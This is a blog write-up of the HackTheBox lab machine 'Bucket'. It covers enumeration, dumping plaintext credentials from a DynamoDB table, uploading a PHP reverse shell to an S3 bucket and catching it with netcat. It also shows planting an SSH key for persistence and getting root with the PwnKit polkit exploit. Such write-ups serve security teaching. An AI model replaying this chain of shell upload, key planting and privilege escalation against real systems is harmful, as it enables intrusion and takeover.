---
layout: post
title: "HTB: Bucket"
author: Andrew Cherney
date: 2023-03-16 21:13:57
tags: htb medium-box
icon: "assets/icons/bucket.png"
post_description: "The steps outlined in this summary involve identifying a hidden subdomain, scanning for directories, using the AWS Command Line Interface (CLI) to grab credentials from a NoSQL database named DynamoDB, uploading a reverse shell to an S3 bucket using the AWS CLI, and exploiting a vulnerable version of Polkit for root access."
---

<h1>ChatGPT Summary</h1>

{{ page.post_description }}

<h1>Enumeration</h1>

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Bucket]
└──╼ $nmap -sC 10.10.10.212
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-21 19:58 CDT
Nmap scan report for bucket.htb (10.10.10.212)
Host is up (0.049s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http
|_http-title: Site doesn't have a title (text/html).
```

<h2>Port 80 - http</h2>

![Front page](/img/bucket/Bucket_front_page.png)

On my end the advertising page doesn't format properly, but looking through where the images are located in the source code we can see the subdomain of **s3.bucket.htb** which I will add to my **/etc/hosts** file.

![S3 snitch](/img/bucket/Bucket_s3_snitch.png)

![S3.bucket.htb](/img/bucket/Bucket_s3_check.png)

I'll scan for directories on this subdomain.

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Bucket]
└──╼ $dirb http://s3.bucket.htb/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Mar 21 20:42:55 2023
URL_BASE: http://s3.bucket.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://s3.bucket.htb/ ----
+ http://s3.bucket.htb/health (CODE:200|SIZE:54)                                                     
+ http://s3.bucket.htb/server-status (CODE:403|SIZE:278)                                             
+ http://s3.bucket.htb/shell (CODE:200|SIZE:0)                                                       
                                                                                                     
-----------------
```

![s3 bucket shell](/img/bucket/Bucket_dynamoDB.png)

<h1>User as www-data</h1>

<h2>AWS S3</h2>

Dynamodb is a NoSQL database management API which I can use the aws command to read and interface with. I'll first configure my aws commandlet with aws keys from my access management page. 

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Bucket]
└──╼ $aws configure
AWS Access Key ID [****************V7LF]: AKIA4---------------
AWS Secret Access Key [****************KMbM]: Nj1KWM+dnMbl7ENAF------------------------
Default region name [us-west-2]: 
Default output format []: json
```

Now I can enumerate tables and read those tables.

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Bucket]
└──╼ $aws dynamodb list-tables --endpoint-url http://s3.bucket.htb
{
    "TableNames": [
        "users"
    ]
}
```

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Bucket]
└──╼ $aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb/ 
{
    "Items": [
        {
            "password": {
                "S": "Management@#1@#"
            },
            "username": {
                "S": "Mgmt"
            }
        },
        {
            "password": {
                "S": "Welcome123!"
            },
            "username": {
                "S": "Cloudadm"
            }
        },
        {
            "password": {
                "S": "n2vM-<_K_Q:.Aa2"
            },
            "username": {
                "S": "Sysadm"
            }
        }
    ],
    "Count": 3,
    "ScannedCount": 3,
    "ConsumedCapacity": null
}
```

Looks like some clear credentials. I tried them as SSH but none let me in. Why don't we see what buckets are on the endpoint **s3.bucket.htb**

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Bucket]
└──╼ $aws s3 ls --endpoint-url http://s3.bucket.htb
2023-03-21 21:18:08 adserver
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Bucket]
└──╼ $aws s3 ls s3://adserver --endpoint-url http://s3.bucket.htb
                           PRE images/
2023-03-27 19:16:02       5344 index.html
```

<h2>Bucket file upload</h2>

That index.html is the front page of the regular **bucket.htb** site. Let's try to upload a file through the aws cli. 

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Bucket]
└──╼ $aws s3 cp ./raccoon.txt s3://adserver/raccoon.txt --endpoint-url http://s3.bucket.htb
upload: ./raccoon.txt to s3://adserver/raccoon.txt
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Bucket]
└──╼ $curl http://bucket.htb/raccoon.txt
raccoon
```

Awesome. Now I'll try to upload a php shell.

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Bucket]
└──╼ $aws s3 cp ./shell.php s3://adserver/shell.php --endpoint-url http://s3.bucket.htb/
upload: ./shell.php to s3://adserver/shell.php                 
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Bucket]
└──╼ $curl http://bucket.htb/shell.php
```

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Bucket]
└──╼ $nc -nvlp 7777
listening on [any] 7777 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.212] 33898
Linux bucket 5.4.0-48-generic #52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 00:31:05 up 38 min,  0 users,  load average: 0.01, 0.02, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1056): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bucket:/$
```

<h1>User as roy</h1>

I still have all of those passwords to use. The only user in **/etc/passwd** is roy, so let's try all of them against roy. Might as well make an ssh keypair and toss them in for a better connection.

```bash
su roy
Password: n2vM-<_K_Q:.Aa2
id
uid=1000(roy) gid=1000(roy) groups=1000(roy),1001(sysadm)
cat ~/user.txt
66b08a04485a62fa-----------------
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDSLEKTk/kwbHRe9xI+nBISc2JMBGgwVFHrNh4IWoq2xskeYF5AJJxQioYcYcvTVnXRVmoOv1weIJRh/4ZHWGbMnvxYUfezT40lfyf65Vc/9RHoAf6k7OX1wfr1XLQZTBa28V+MPiQ6mIGEXDAiUsAY0twBKlrWgrogn1KaVCtZA0JmQOda/2qETFZJRtBU4V0XqwxubbfnyRCP+YlkpYFU8O4b8m06foNR/Jo5CeBqbZoZAvJwqp99kmDq4Dz4+ttxfkLWPDg+flPxmiyP5dSS3N/gyGH1xtcUPepxNG2F9gnBJHgBfNSqEFiofE2x69cWdSV15CWw4FDE3jdBtoOBifYFsNQE0uMbpoaG45u6ler0b+GqKJV2HEY5oFYKH+cRrplmm+DB/zYGQiTXildzy3iC0S4pKND0ZyxFm+HUPXeRhddgKOf9JEv1YjhZQzj2ISVuqq7gAm7CieIqMoKJTd3dkt7WLzgYx6/PzOTXaIZ+Fv0hJm7yoggONZ8uGps= raccoon@cyberraccoon-virtualbox" > ~/.ssh/authorized_keys
```

<h1>Root</h1>

Linpeas reveals right away that this is vulnerable to potentially two CVEs.

```bash
╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034

Vulnerable to CVE-2021-3560

Potentially Vulnerable to CVE-2022-2588
```

Effecitvely polkit-1 is vulnerable to two main CVEs listed here. For [CVE-2021-4034](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034) there is a way to out-of-bounds write an unsecure environment variable into pkexec's environment, specifically GCONV_PATH to execute our own shared library as root. Normally these environment variables would be eliminated by **ld.so** from the environment of SUID programs, but the exploit works by reintroducing the variable after **ld.so** has done its thing.  

I'll use [this CVE-2021-4043 exploit](https://github.com/arthepsy/CVE-2021-4034), create the file, run gcc which is locally on the machine, and gain root.

```bash
roy@bucket:~$ nano polkit_cve.c
roy@bucket:~$ gcc polkit_cve.c -o polkit_cve
roy@bucket:~$ ./polkit_cve 
# cat /root/root.txt
ae68b685e4----------------------
```
